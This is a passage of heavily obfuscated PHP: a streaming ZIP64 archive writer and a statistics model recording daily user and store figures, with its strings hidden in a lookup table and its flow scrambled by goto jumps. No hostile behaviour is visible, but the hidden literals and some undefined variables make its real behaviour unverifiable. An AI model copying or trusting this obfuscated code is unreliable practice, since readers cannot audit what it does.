$F‡Ü¡èĞ²Ì[112]) || substr($D¶¨ÚçäØ·, 0, 1) == $F‡Ü¡èĞ²Ì[55] && substr($D¶¨ÚçäØ·, -1) == $F‡Ü¡èĞ²Ì[55]) { $D¶¨ÚçäØ· = substr($D¶¨ÚçäØ·, 1, -1); $C„ˆ¸Ãï± = array($D¶¨ÚçäØ·); } $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[28]] = array($F‡Ü¡èĞ²Ì[478], $F‡Ü¡èĞ²Ì[2158] . $D¶¨ÚçäØ· . $F‡Ü¡èĞ²Ì[2158]); if (count($C„ˆ¸Ãï±) > 1) { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[28]] = array(); foreach ($C„ˆ¸Ãï± as $aã·ˆù•‘£) { if (!trim($aã·ˆù•‘£)) { continue; } $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[28]][] = array($F‡Ü¡èĞ²Ì[478], $F‡Ü¡èĞ²Ì[2158] . trim($aã·ˆù•‘£) . $F‡Ü¡èĞ²Ì[2158]); } } } return $C»Óó‡Èç•; goto e´ï Ú¸Ì; eóíª‹ß‘Š: if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[530]])) { $C»Óó‡Èç•[] = array($F‡Ü¡èĞ²Ì[375] => $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[530]], $F‡Ü¡èĞ²Ì[374] => $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[530]], $F‡Ü¡èĞ²Ì[918] => $F‡Ü¡èĞ²Ì[2160]); } if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[368]])) { $cçà”ÈÑåî = $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[368]]; if ($cçà”ÈÑåî == $F‡Ü¡èĞ²Ì[76]) { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[366]] = 1; } else { if ($cçà”ÈÑåî == $F‡Ü¡èĞ²Ì[2294]) { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[366]] = 0; } else { if ($cçà”ÈÑåî) { $cçà”ÈÑåî = is_array($cçà”ÈÑåî) ? $cçà”ÈÑåî : explode($F‡Ü¡èĞ²Ì[47], $cçà”ÈÑåî); $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[368]] = array($F‡Ü¡èĞ²Ì[380], $cçà”ÈÑåî); $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[366]] = 0; } } } } if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[456]])) { $dá®¶£ğ£ = $this->sourceInfo($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[456]]); $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[520]] = array($F‡Ü¡èĞ²Ì[478], $dá®¶£ğ£[$F‡Ü¡èĞ²Ì[454]] . $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[456]] . $F‡Ü¡èĞ²Ì[479]); } goto dî¬öÒêÚæ; cÜ´¡Ø‡ ë: $F‡Ü¡èĞ²Ì =& $_SERVER[Õİõş]; $C»Óó‡Èç• = array(); if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[704]])) { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[106]] = array($F‡Ü¡èĞ²Ì[2289], $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[704]]); } goto dã¸ËÀ¬ø÷; dã¸ËÀ¬ø÷: if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[705]])) { $bÓ¸Ÿõ† = array($F‡Ü¡èĞ²Ì[2290], $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[705]]); if ($C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[106]]) { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[106]] = array($C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[106]], $bÓ¸Ÿõ†, $F‡Ü¡èĞ²Ì[2291]); } else { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[106]] = $bÓ¸Ÿõ†; } } if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[2292]])) { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[77]] = array($F‡Ü¡èĞ²Ì[2289], $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[2292]]); } if (isset($Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[2293]])) { $bÓ¸Ÿõ† = array($F‡Ü¡èĞ²Ì[2290], $Fìî»¶Å‰›[$F‡Ü¡èĞ²Ì[2293]]); if ($C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[77]]) { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[77]] = array($C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[77]], $bÓ¸Ÿõ†, $F‡Ü¡èĞ²Ì[2291]); } else { $C»Óó‡Èç•[$F‡Ü¡èĞ²Ì[77]] = $bÓ¸Ÿõ†; } } goto eóíª‹ß‘Š; e´ï Ú¸Ì: } } goto BÖºˆö×Ğ¾; AÏÖÈ£à: class ZipMake { const VERSION = "\60\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($Có¼Æù²ãª = null) { $DÚ±ƒ²–›§ =& $_SERVER[Õİõş]; $this->outputStream = fopen($DÚ±ƒ²–›§[1985], $DÚ±ƒ²–›§[1221]); $this->outputName = $Có¼Æù²ãª; $this->needHeaders = !0; } public function addFile($B¬«‡‘’æö, $F‹‰Ë“Áöš) { goto C˜ë¬•¨Óó; dÄ§¬¦æš: $dÊŞ»»äÌ’ = $this->addFileHeader($B¬«‡‘’æö, $CÜ°ÓŸÛº‰); $C´Íã·¤Õ¾ = $c£ê¬ë…ÃÚ = filesize($F‹‰Ë“Áöš); $aŒŠîã°£ä = fopen($F‹‰Ë“Áöš, $dãâĞÛË®Ù[1986]); goto eÍ´ÕíàŠ™; eÍ´ÕíàŠ™: while (!feof($aŒŠîã°£ä)) { $Fá÷–èĞ¥Ğ = fread($aŒŠîã°£ä, 1048576); $this->send($Fá÷–èĞ¥Ğ); } fclose($aŒŠîã°£ä); $bÍ¬ÇÒĞ = hexdec(hash_file($dãâĞÛË®Ù[1987], $F‹‰Ë“Áöš)); goto Fò´Ò…Ú”; C˜ë¬•¨Óó: $dãâĞÛË®Ù =& $_SERVER[Õİõş]; $B¬«‡‘’æö = $this->filterFilename($B¬«‡‘’æö); $CÜ°ÓŸÛº‰ = static::METHOD_STORE; goto dÄ§¬¦æš; Fò´Ò…Ú”: $this->addFileFooter($B¬«‡‘’æö, $CÜ°ÓŸÛº‰, $bÍ¬ÇÒĞ, $C´Íã·¤Õ¾, $c£ê¬ë…ÃÚ, $dÊŞ»»äÌ’); goto F½¨áğçÚ; F½¨áğçÚ: } public function addFileFromStream($EôÑ¬ºÁƒ¥, $BÆë¥ŞÃòÏ) { goto Fš“ÚÌÉÊá; f­…×è¦¤’: fseek($BÆë¥ŞÃòÏ, 0, SEEK_END); $cÏ×•»§˜¶ = $Eì÷’œ¦Áâ = ftell($BÆë¥ŞÃòÏ); rewind($BÆë¥ŞÃòÏ); goto A®—è‰áÓ; A®—è‰áÓ: $cÈ³¯åÆ± = hash_init($_SERVER[Õİõş][1987]); while (!feof($BÆë¥ŞÃòÏ)) { $Bìªàò¤Á³ = fread($BÆë¥ŞÃòÏ, 1048576); hash_update($cÈ³¯åÆ±, $Bìªàò¤Á³); $this->send($Bìªàò¤Á³); } $cé£± ÑôÛ = hexdec(hash_final($cÈ³¯åÆ±)); goto fá‰ôÀ¶õ; fá‰ôÀ¶õ: $this->addFileFooter($EôÑ¬ºÁƒ¥, $A½íÀ«‰, $cé£± ÑôÛ, $cÏ×•»§˜¶, $Eì÷’œ¦Áâ, $D¾Ôí¤º©¼); goto E˜¼Ë•öÚ›; Fš“ÚÌÉÊá: $EôÑ¬ºÁƒ¥ = $this->filterFilename($EôÑ¬ºÁƒ¥); $A½íÀ«‰ = static::METHOD_STORE; $D¾Ôí¤º©¼ = $this->addFileHeader($EôÑ¬ºÁƒ¥, $A½íÀ«‰); goto f­…×è¦¤’; E˜¼Ë•öÚ›: } public function finish() { foreach ($this->files as $C‚†µì…Ç) { $this->addCdrFile($C‚†µì…Ç); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($FšÆöÉÀ£µ, $D×‘³‡®Ìº) { goto F™ã‰èì¯; aÊá†ñõæ±: return strlen($DËÈÎó©‹) + $dñ¡ñ§çÎè + strlen($cöµÙ‚µ‡); goto AœÇ‚’¯’; D¨·ËèïÉë: $DËÈÎó©‹ = $this->packFields($BÌêÔ•­İê); $cöµÙ‚µ‡ = $this->packFields($Fî÷”ğš¼ç); $this->send($DËÈÎó©‹ . $FšÆöÉÀ£µ . $cöµÙ‚µ‡); goto aÊá†ñõæ±; e…÷¾—Ùì: $Dµ ¡§ùåÌ = $this->dosTime(time()); $BÌêÔ•­İê = array(array($BØïÑ«ÖåÒ[1989], static::FILE_HEADER_SIGNATURE), array($BØïÑ«ÖåÒ[1990], static::ZIP_VERSION_64), array($BØïÑ«ÖåÒ[1990], 8), array($BØïÑ«ÖåÒ[1990], $D×‘³‡®Ìº), array($BØïÑ«ÖåÒ[1989], $Dµ ¡§ùåÌ), array($BØïÑ«ÖåÒ[1989], 0), array($BØïÑ«ÖåÒ[1989], 4294967295), array($BØïÑ«ÖåÒ[1989], 4294967295), array($BØïÑ«ÖåÒ[1990], $dñ¡ñ§çÎè), array($BØïÑ«ÖåÒ[1990], 32)); $Fî÷”ğš¼ç = array(array($BØïÑ«ÖåÒ[1990], 1), array($BØïÑ«ÖåÒ[1990], 28), array($BØïÑ«ÖåÒ[1991], 0), array($BØïÑ«ÖåÒ[1991], 0), array($BØïÑ«ÖåÒ[1991], 0), array($BØïÑ«ÖåÒ[1989], 0)); goto D¨·ËèïÉë; F™ã‰èì¯: $BØïÑ«ÖåÒ =& $_SERVER[Õİõş]; $FšÆöÉÀ£µ = preg_replace($BØïÑ«ÖåÒ[1988], $BØïÑ«ÖåÒ[33], $FšÆöÉÀ£µ); $dñ¡ñ§çÎè = strlen($FšÆöÉÀ£µ); goto e…÷¾—Ùì; AœÇ‚’¯’: } protected function addFileFooter($F™™Ï¼—¢, $F‡Šáù›, $bØ÷ÓàÌ•, $C¦¹ÕÙË¸Ù, $b›Ø¸´µùÓ, $C¬Å”Ãê‹±) { $EĞåäéá–Ç =& $_SERVER[Õİõş]; $c¥ƒ¾ğ¤ğğ = array(array($EĞåäéá–Ç[1989], static::DATA_DESCRIPTOR_SIGNATURE), array($EĞåäéá–Ç[1989], $bØ÷ÓàÌ•), array($EĞåäéá–Ç[1991], $C¦¹ÕÙË¸Ù), array($EĞåäéá–Ç[1991], $b›Ø¸´µùÓ)); $aßÉŠöéğ¡ = $this->packFields($c¥ƒ¾ğ¤ğğ); $this->send($aßÉŠöéğ¡); $d™¿Ò»£‰ = $C¬Å”Ãê‹± + $C¦¹ÕÙË¸Ù + $dò‚Å¿ÆÙÑ; $this->addToCdr($F™™Ï¼—¢, $F‡Šáù›, $bØ÷ÓàÌ•, $C¦¹ÕÙË¸Ù, $b›Ø¸´µùÓ, $d™¿Ò»£‰); } private function addToCdr($C“”œÅÆÃ , $CãÒ˜Çç, $cŞÌ¯‚ğƒ², $dÑò«ˆ¥˜Ø, $F—¼ÇÎİç•, $BÁÖöößõ) { $this->files[] = array($C“”œÅÆÃ , $CãÒ˜Çç, $cŞÌ¯‚ğƒ², $dÑò«ˆ¥˜Ø, $F—¼ÇÎİç•, $this->ofs); $this->ofs += $BÁÖöößõ; } protected function addCdrFile($a´Ô‡Ÿ†¥) { goto f×†Âäè¨; Dñ‹³‡»­: $eÇ†„§‹÷ = $this->dosTime(time()); $F·ùò•×çç = array(array($b•Ëİ¢Ğ„ø[1989], static::CDR_FILE_SIGNATURE), array($b•Ëİ¢Ğ„ø[1990], static::ZIP_VERSION_64), array($b•Ëİ¢Ğ„ø[1990], static::ZIP_VERSION_64), array($b•Ëİ¢Ğ„ø[1990], 8), array($b•Ëİ¢Ğ„ø[1990], $có²°ÉŒ¼‚), array($b•Ëİ¢Ğ„ø[1989], $eÇ†„§‹÷), array($b•Ëİ¢Ğ„ø[1989], $BÆº¯ ó”Å), array($b•Ëİ¢Ğ„ø[1989], 4294967295), array($b•Ëİ¢Ğ„ø[1989], 4294967295), array($b•Ëİ¢Ğ„ø[1990], strlen($c÷¥«ö¿‚×)), array($b•Ëİ¢Ğ„ø[1990], 32), array($b•Ëİ¢Ğ„ø[1990], strlen($E‡‰õŠÓ¾)), array($b•Ëİ¢Ğ„ø[1990], 0), array($b•Ëİ¢Ğ„ø[1990], 0), array($b•Ëİ¢Ğ„ø[1989], 32), array($b•Ëİ¢Ğ„ø[1989], 4294967295)); $a¡Ï‡³©Ê = array(array($b•Ëİ¢Ğ„ø[1990], 1), array($b•Ëİ¢Ğ„ø[1990], 28), array($b•Ëİ¢Ğ„ø[1991], $dÚ‚³®§âŒ), array($b•Ëİ¢Ğ„ø[1991], $f»àÎÌ¥˜¹), array($b•Ëİ¢Ğ„ø[1991], $B¦™ğ†ô¢), array($b•Ëİ¢Ğ„ø[1989], 0)); goto BØ¢²éå; f×†Âäè¨: $b•Ëİ¢Ğ„ø =& $_SERVER[Õİõş]; list($c÷¥«ö¿‚×, $có²°ÉŒ¼‚, $BÆº¯ ó”Å, $f»àÎÌ¥˜¹, $dÚ‚³®§âŒ, $B¦™ğ†ô¢) = $a´Ô‡Ÿ†¥; $E‡‰õŠÓ¾ = $b•Ëİ¢Ğ„ø[33]; goto Dñ‹³‡»­; D·İİƒ½—÷: $this->send($aø¡‚ç‡ÑÄ); $this->cdr_ofs += strlen($aø¡‚ç‡ÑÄ); goto dÎ‚’ÈÁÓõ; BØ¢²éå: $a²Ö¥ŠÙ”Ñ = $this->packFields($F·ùò•×çç); $aãŠŠ ¡¢› = $this->packFields($a¡Ï‡³©Ê); $aø¡‚ç‡ÑÄ = $a²Ö¥ŠÙ”Ñ . $c÷¥«ö¿‚× . $E‡‰õŠÓ¾ . $aãŠŠ ¡¢›; goto D·İİƒ½—÷; dÎ‚’ÈÁÓõ: } protected function addCdr64Eof() { goto F“ºñİÄ; F’÷ç‡ßÂ: $aæöœÑ¨Äå = $this->ofs; $e¨ƒÀòÇÌƒ = array(array($E ¹«’Ãà[1989], static::ZIP64_CDR_EOF_SIGNATURE), array($E ¹«’Ãà[1991], 44), array($E ¹«’Ãà[1990], static::ZIP_VERSION_64), array($E ¹«’Ãà[1990], static::ZIP_VERSION_64), array($E ¹«’Ãà[1989], 0), array($E ¹«’Ãà[1989], 0), array($E ¹«’Ãà[1991], $DÛø‹ÏàÚ), array($E ¹«’Ãà[1991], $DÛø‹ÏàÚ), array($E ¹«’Ãà[1991], $Fë”¼¸åŠ), array($E ¹«’Ãà[1991], $aæöœÑ¨Äå)); $D“¸àÍ± = $this->packFields($e¨ƒÀòÇÌƒ); goto fÀ›¯‘†º; F“ºñİÄ: $E ¹«’Ãà =& $_SERVER[Õİõş]; $DÛø‹ÏàÚ = count($this->files); $Fë”¼¸åŠ = $this->cdr_ofs; goto F’÷ç‡ßÂ; fÀ›¯‘†º: $this->send($D“¸àÍ±); goto b¶ß¶ØÚ”ğ; b¶ß¶ØÚ”ğ: } protected function addCdr64Locator() { goto F§¡èØô¬Å; F§¡èØô¬Å: $A‹ã¿‘æÌ¢ =& $_SERVER[Õİõş]; $C‰Æ¯ÌˆÚÏ = count($this->files); $aÁœò•Öí = $this->cdr_ofs; goto d²Ñ««À; Fïé³ó†Á—: $this->send($dí´¬ƒ¬íŞ); goto f™ğé°›Ü¿; d²Ñ««À: $AğËŒĞ÷ = $this->ofs; $f…×›œ·÷¢ = array(array($A‹ã¿‘æÌ¢[1989], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($A‹ã¿‘æÌ¢[1989], 0), array($A‹ã¿‘æÌ¢[1991], $AğËŒĞ÷ + $aÁœò•Öí), array($A‹ã¿‘æÌ¢[1989], 1)); $dí´¬ƒ¬íŞ = $this->packFields($f…×›œ·÷¢); goto Fïé³ó†Á—; f™ğé°›Ü¿: } protected function addCdrEof() { goto f¢”‚´öŠÁ; f¢”‚´öŠÁ: $Dˆ©ÌÒØô½ =& $_SERVER[Õİõş]; $aºÑ¬Î…ñ = count($this->files); $bÏ­…Â®½¤ = $this->cdr_ofs; goto F¯²¨‹Ï±°; d²†õ¶òÍ‹: $EŞ›Ùƒ«Ù¯ = $this->packFields($c³íòÀÒÕ) . $b¾½®…ç»; $this->send($EŞ›Ùƒ«Ù¯); goto C’Š¯ÏâßÚ; F¯²¨‹Ï±°: $dÎœ†ŞÅ‘ = $this->ofs; $b¾½®…ç» = $Dˆ©ÌÒØô½[33]; $c³íòÀÒÕ = array(array($Dˆ©ÌÒØô½[1989], static::CDR_EOF_SIGNATURE), array($Dˆ©ÌÒØô½[1990], 0), array($Dˆ©ÌÒØô½[1990], 0), array($Dˆ©ÌÒØô½[1990], $aºÑ¬Î…ñ), array($Dˆ©ÌÒØô½[1990], $aºÑ¬Î…ñ), array($Dˆ©ÌÒØô½[1989], 4294967295), array($Dˆ©ÌÒØô½[1989], 4294967295), array($Dˆ©ÌÒØô½[1990], strlen($b¾½®…ç»))); goto d²†õ¶òÍ‹; C’Š¯ÏâßÚ: } protected function addCdr() { foreach ($this->files as $eƒÎ¨Á¼ËÄ) { $this->addCdrFile($eƒÎ¨Á¼ËÄ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $e†ÎÃËŠÙ =& $_SERVER[Õİõş]; $BÌëé’¿Š = $e†ÎÃËŠÙ[198]; if ($this->outputName) { $E†âõ¬ÃÒ¯ = trim(str_replace(array($e†ÎÃËŠÙ[112], $e†ÎÃËŠÙ[55], $e†ÎÃËŠÙ[93], $e†ÎÃËŠÙ[67], $e†ÎÃËŠÙ[213], $e†ÎÃËŠÙ[994]), $e†ÎÃËŠÙ[33], $this->outputName)); $f‰ÍŸë‰…ç = rawurlencode($E†âõ¬ÃÒ¯); $BÌëé’¿Š .= "\73\40\146\151\x6c\x65\x6e\x61\x6d\145\x2a\x3d\x75\164\146\x2d\70\47\x27{$f‰ÍŸë‰…ç}"; } $A¢ö÷ÆÍá” = array($e†ÎÃËŠÙ[195] => $e†ÎÃËŠÙ[1992], $e†ÎÃËŠÙ[1993] => $BÌëé’¿Š, $e†ÎÃËŠÙ[1994] => $e†ÎÃËŠÙ[1995], $e†ÎÃËŠÙ[1996] => $e†ÎÃËŠÙ[1997], $e†ÎÃËŠÙ[1998] => $e†ÎÃËŠÙ[1999]); foreach ($A¢ö÷ÆÍá” as $d¦é‡ÃÚ÷ö => $C·õ’±§ª) { header($d¦é‡ÃÚ÷ö . $e†ÎÃËŠÙ[884] . $C·õ’±§ª); } } protected function send($BÏƒïŸ–‚‰) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $BÏƒïŸ–‚‰); } protected final function dosTime($F˜Æé„Ş…ô) { $FŸ¡©‰¼ =& $_SERVER[Õİõş]; $AÆ”ÅÙä« = getdate($F˜Æé„Ş…ô); if ($AÆ”ÅÙä«[$FŸ¡©‰¼[1702]] < 1980) { $AÆ”ÅÙä« = array($FŸ¡©‰¼[1702] => 1980, $FŸ¡©‰¼[2000] => 1, $FŸ¡©‰¼[2001] => 1, $FŸ¡©‰¼[2002] => 0, $FŸ¡©‰¼[2003] => 0, $FŸ¡©‰¼[2004] => 0); } $AÆ”ÅÙä«[$FŸ¡©‰¼[1702]] -= 1980; return $AÆ”ÅÙä«[$FŸ¡©‰¼[1702]] << 25 | $AÆ”ÅÙä«[$FŸ¡©‰¼[2000]] << 21 | $AÆ”ÅÙä«[$FŸ¡©‰¼[2001]] << 16 | $AÆ”ÅÙä«[$FŸ¡©‰¼[2002]] << 11 | $AÆ”ÅÙä«[$FŸ¡©‰¼[2003]] << 5 | $AÆ”ÅÙä«[$FŸ¡©‰¼[2004]] >> 1; } protected function packFields($A•“†™³„) { $FêŸæá™ø =& $_SERVER[Õİõş]; $CÔ÷÷×ƒÇ = $FêŸæá™ø[33]; $AçÅ‘‹–‘± = array(); foreach ($A•“†™³„ as $Bí‹¸óâ›ß) { $CÔ÷÷×ƒÇ .= $Bí‹¸óâ›ß[0]; $AçÅ‘‹–‘±[] = $Bí‹¸óâ›ß[1]; } array_unshift($AçÅ‘‹–‘±, $CÔ÷÷×ƒÇ); return call_user_func_array($FêŸæá™ø[2005], $AçÅ‘‹–‘±); } protected function filterFilename($fÀßâİË–) { $EÕ¢ÜÃ›„ä =& $_SERVER[Õİõş]; return str_replace(array($EÕ¢ÜÃ›„ä[93], $EÕ¢ÜÃ›„ä[4], $EÕ¢ÜÃ›„ä[172], $EÕ¢ÜÃ›„ä[69], $EÕ¢ÜÃ›„ä[112], $EÕ¢ÜÃ›„ä[929], $EÕ¢ÜÃ›„ä[932], $EÕ¢ÜÃ›„ä[267]), $EÕ¢ÜÃ›„ä[70], $fÀßâİË–); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($Ašè¨¥º·â) { $C’–‰š½è =& $_SERVER[Õİõş]; $c½¾¶°Æä = array($C’–‰š½è[530] => array($C’–‰š½è[29] => $C’–‰š½è[2006], $C’–‰š½è[257] => array($C’–‰š½è[206], $C’–‰š½è[702], $C’–‰š½è[2007], $C’–‰š½è[2008])), $C’–‰š½è[2009] => array($C’–‰š½è[29] => $C’–‰š½è[2010], $C’–‰š½è[257] => array($C’–‰š½è[206], $C’–‰š½è[700], $C’–‰š½è[2011], $C’–‰š½è[2012], $C’–‰š½è[2013]))); if (!isset($c½¾¶°Æä[$Ašè¨¥º·â])) { return !1; } $this->optionType = $c½¾¶°Æä[$Ašè¨¥º·â][$C’–‰š½è[29]]; $this->field = $c½¾¶°Æä[$Ašè¨¥º·â][$C’–‰š½è[257]]; return !0; } public function listData($Fó«ïÛÊË = false, $c†ô’ïÒÓ³ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\155\x65", $DÇØÕ‘ŞÍ¢ = false) { return parent::listData($Fó«ïÛÊË, $c†ô’ïÒÓ³, $DÇØÕ‘ŞÍ¢); } public function trendList($d§¶ï²ÎÆ†) { goto C‹èÅÇÏ³Ä; C‹èÅÇÏ³Ä: $cáÅÜó®Óƒ =& $_SERVER[Õİõş]; $a±£Ì…İ‹ = $this->listData(); if ($a±£Ì…İ‹) { $dèéáŠ´˜‰ = end($a±£Ì…İ‹); $aÛ˜®«½¡ = date($cáÅÜó®Óƒ[2014], strtotime($cáÅÜó®Óƒ[2015])); if ($dèéáŠ´˜‰[$cáÅÜó®Óƒ[206]] == $aÛ˜®«½¡) { return $a±£Ì…İ‹; } $A©š¼Ë¸İ = strtotime($dèéáŠ´˜‰[$cáÅÜó®Óƒ[206]]); } goto CËØÛ©ë¢; FÑ¼©»èæ: foreach ($aÇäõ–˜‰ as $aÛ˜®«½¡) { $this->{$B‰ËÏ•à¾„}($aÛ˜®«½¡); } return $this->listData(); goto BÔÙÁî˜ˆ; CËØÛ©ë¢: if (!isset($A©š¼Ë¸İ)) { $cÖœÜÇ«»Ò = $d§¶ï²ÎÆ† == $cáÅÜó®Óƒ[530] ? $cáÅÜó®Óƒ[472] : $cáÅÜó®Óƒ[754]; $A©š¼Ë¸İ = Model($cÖœÜÇ«»Ò)->min($cáÅÜó®Óƒ[183]); } $B‰ËÏ•à¾„ = $cáÅÜó®Óƒ[2016] . ucfirst($d§¶ï²ÎÆ†); $aÇäõ–˜‰ = $this->dateList($A©š¼Ë¸İ); goto FÑ¼©»èæ; BÔÙÁî˜ˆ: } private function dateList($fˆë¥åÓ¦‚) { $dèÂğ˜Ûæà =& $_SERVER[Õİõş]; $B•ïó¨åÚ = $fˆë¥åÓ¦‚; $AŒÁ×Ü½Ğˆ = strtotime($dèÂğ˜Ûæà[2015]); $c•„Î¡œ¬Ÿ = array(); while ($B•ïó¨åÚ <= $AŒÁ×Ü½Ğˆ) { $c•„Î¡œ¬Ÿ[] = date($dèÂğ˜Ûæà[2014], $B•ïó¨åÚ); $B•ïó¨åÚ = strtotime($dèÂğ˜Ûæà[2017], $B•ïó¨åÚ); } return $c•„Î¡œ¬Ÿ; } public function _recordUser($eˆ‚„šŒš± = '') { goto A¥¸Ò·¥Ëë; A¥¸Ò·¥Ëë: $aÅª±©ÌÚÓ =& $_SERVER[Õİõş]; $cŸƒâö‰Ù = strtotime(date($aÅª±©ÌÚÓ[2018], strtotime($eˆ‚„šŒš±))); $C¯£ïæ…¨´ = strtotime(date($aÅª±©ÌÚÓ[2019], strtotime($eˆ‚„šŒš±))); goto BµÂ¥çÒÜõ; B¦Æ öÉğ: $EæÆñ¹ê¥ß = Model($aÅª±©ÌÚÓ[472])->where($Eô°ƒôªÉ¾)->count($aÅª±©ÌÚÓ[1417]); $Eô°ƒôªÉ¾[$aÅª±©ÌÚÓ[29]] = $aÅª±©ÌÚÓ[2020]; $F—è´À­ = Model($aÅª±©ÌÚÓ[2021])->where($Eô°ƒôªÉ¾)->count($aÅª±©ÌÚÓ[2022]); goto cŒÕ˜°ñÊ; BµÂ¥çÒÜõ: $Eô°ƒôªÉ¾ = array($aÅª±©ÌÚÓ[183] => array($aÅª±©ÌÚÓ[931], $C¯£ïæ…¨´)); $bÁ°†Š¼¯ = Model($aÅª±©ÌÚÓ[472])->where($Eô°ƒôªÉ¾)->count($aÅª±©ÌÚÓ[1417]); $Eô°ƒôªÉ¾[$aÅª±©ÌÚÓ[183]] = array($aÅª±©ÌÚÓ[317], array($cŸƒâö‰Ù, $C¯£ïæ…¨´)); goto B¦Æ öÉğ; cŒÕ˜°ñÊ: $F…Æ½÷¶ = array($aÅª±©ÌÚÓ[206] => $eˆ‚„šŒš±, $aÅª±©ÌÚÓ[702] => (int) $bÁ°†Š¼¯, $aÅª±©ÌÚÓ[2007] => (int) $EæÆñ¹ê¥ß, $aÅª±©ÌÚÓ[2008] => (int) $F—è´À­); return $this->insert($F…Æ½÷¶); goto EŞË—ÊùÎ; EŞË—ÊùÎ: } public function _recordStore($fªÏ¬Ñé ¬ = '') { goto EñêÓĞÂŞ‚; e¥‡íˆ½…: $d™™—…¡ä[$fÒ…ƒÑæº[367]] = 1; $dàÊË‡‘Ì“ = Model($fÒ…ƒÑæº[754])->where($d™™—…¡ä)->sum($fÒ…ƒÑæº[77]); $d™™—…¡ä[$fÒ…ƒÑæº[367]] = 2; goto F­ëàµ¹Î¡; EñêÓĞÂŞ‚: $fÒ…ƒÑæº =& $_SERVER[Õİõş]; $e–ïô½ÛÀ = strtotime(date($fÒ…ƒÑæº[2019], strtotime($fªÏ¬Ñé ¬))); $d™™—…¡ä = array($fÒ…ƒÑæº[183] => array($fÒ…ƒÑæº[931], $e–ïô½ÛÀ)); goto AÉîÜÓ™¯İ; F­ëàµ¹Î¡: $eè‡‡ôêËÆ = Model($fÒ…ƒÑæº[754])->where($d™™—…¡ä)->sum($fÒ…ƒÑæº[77]); $d„Ù¦À¡Ì = array($fÒ…ƒÑæº[206] => $fªÏ¬Ñé ¬, $fÒ…ƒÑæº[700] => (int) $d©é†ƒ¼á¶, $fÒ…ƒÑæº[2011] => (int) $CÛ“‰“øİñ, $fÒ…ƒÑæº[2012] => (int) $dàÊË‡‘Ì“, $fÒ…ƒÑæº[2013] => (int) $eè‡‡ôêËÆ); return $this->insert($d„Ù¦À¡Ì); goto bçÇ²ÁãŠ; AÉîÜÓ™¯İ: $CÛ“‰“øİñ = Model($fÒ…ƒÑæº[417])->where($d™™—…¡ä)->sum($fÒ…ƒÑæº[77]); $d™™—…¡ä[$fÒ…ƒÑæº[366]] = 0; $d©é†ƒ¼á¶ = Model($fÒ…ƒÑæº[754])->where($d™™—…¡ä)->sum($fÒ…ƒÑæº[77]); goto e¥‡íˆ½…; bçÇ²ÁãŠ: } public function trend($a–¨‹Ñ, $bæ›íÀ÷) { goto dó‰À‹ÍÕÉ; B×Êğ³îíó: if (empty($c‰ÅŠ§¶Ù)) { $bñ——Áˆó˜ = date($d»¾²ƒ¥Í¾[2014], strtotime($d»¾²ƒ¥Í¾[2015])); $E§¿™Èöß› = array($d»¾²ƒ¥Í¾[206] => $bñ——Áˆó˜); foreach ($d ‡ó¾¨ÍÑ[$a–¨‹Ñ] as $D·íÜËè¿¶ => $CæÀÆµËõ) { $E§¿™Èöß›[$D·íÜËè¿¶] = 0; } $c‰ÅŠ§¶Ù[] = $E§¿™Èöß›; } $B§Ò¦ƒÃ×‹ = array(); foreach ($c‰ÅŠ§¶Ù as $CæÀÆµËõ) { if ($a–¨‹Ñ == $d»¾²ƒ¥Í¾[2009] && $CæÀÆµËõ[$d»¾²ƒ¥Í¾[2011]] > $CæÀÆµËõ[$d»¾²ƒ¥Í¾[700]]) { $CæÀÆµËõ[$d»¾²ƒ¥Í¾[2011]] = $CæÀÆµËõ[$d»¾²ƒ¥Í¾[700]]; } foreach ($d ‡ó¾¨ÍÑ[$a–¨‹Ñ] as $D·íÜËè¿¶ => $f‚°ñ¡ãÁ) { $aÄ„ÓÀò‚ = array($d»¾²ƒ¥Í¾[206] => 